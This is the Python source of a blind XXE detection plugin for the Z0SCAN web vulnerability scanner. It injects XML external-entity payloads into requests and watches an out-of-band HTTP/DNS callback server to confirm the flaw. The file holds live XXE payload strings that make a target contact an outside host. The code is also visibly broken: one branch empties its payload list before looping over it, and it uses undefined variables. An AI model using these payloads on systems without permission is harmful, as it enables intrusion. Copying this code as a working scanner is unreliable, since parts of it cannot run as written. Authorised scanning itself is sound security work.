#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/8/20

import requests
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB

class Z0SCAN(PluginBase):
    name = "xxe-blind"
    desc = 'Blind XXE plugin detects out-of-band data exfiltration.'
    version = "2025.8.20"
    risk = 3
    require_reverse = True
        
    def audit(self):
        if conf.level == 0 or not self.risk in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            if self.requests.post_hint == POST_HINT.XML:
                payloads = [
                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo SYSTEM "{}">'
                ]
                url = self.requests.url
                payloads = ()
                for payload in payloads:
                    for type in ["http", "dns"]:
                        if type in KB.reverse_running_server:
                            token, fullname = self.rA.generate(type)
                            if type == "dns":
                                fullname = "http://" + fullname
                            r = requests.get(url, params=self.requests.params, data=payload.format(fullname), headers=self.requests.headers)
                            if not r:
                                continue
                            rA = reverseApi()
                            if rA.check(token):
                                result = self.generate_result()
                                result.main({
                                    "type": Type.REQUEST, 
                                    "url": r.url, 
                                    "vultype": VulType.XXE, 
                                    "show": {
                                        "Position": f"{position} >> {k}", 
                                        "Payload": payload,
                                        "Msg": "Receive from Dnslog",
                                        }
                                    })
                                result.step("Request1", {
                                    "position": position,
                                    "request": r.reqinfo, 
                                    "response": generateResponse(r), 
                                    "desc": "Payload: {} Receive from Dnslog".format(payload),
                                    })
                                self.success(result)
                                break
            elif self.requests.params or self.requests.post_hint == POST_HINT.NORMAL or self.requests.post_hint == POST_HINT.ARRAY_LIKE:
                payloads = [
                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE convert [<!ENTITY % remote SYSTEM "{}">%remote;]>',
                    r'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE uuu SYSTEM "{}">'
                    ]
                iterdatas = self.generateItemdatas()
                test_args = []
                for _ in iterdatas:
                    k, v, position = _
                    if "xml" in k:
                        test_args.append(_)
                z0thread = Threads(name="xxe-blind")
                z0thread.submit(self.process, test_args, payloads)
    
    def process(self, _, payloads):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        rA = reverseApi()
        for type in ["http", "dns"]:
            if type in KB.reverse_running_server:
                token, fullname = self.generate(type)
                if type == "dns":
                    fullname = "http://" + fullname
                for payload in payloads:
                    payload = payload.format(fullname)
                    payload = self.insertPayload({
                        "key": k, 
                        "payload": payload, 
                        "position": position, 
                        })
                    r = self.req(position, payload)
                    if not r:
                        continue
                    if rA.check(token):
                        result = self.generate_result()
                        result.main({
                            "type": Type.REQUEST, 
                            "url": r.url, 
                            "vultype": VulType.XXE, 
                            "show": {
                                "Position": f"{position} >> {k}", 
                                "Payload": payload,
                                "Msg": "Receive from Dnslog",
                                }
                            })
                        result.step("Request1", {
                            "position": position,
                            "request": r.reqinfo, 
                            "response": generateResponse(r), 
                            "desc": "Payload: {} Receive from Dnslog".format(payload),
                            })
                        self.success(result)
                        break

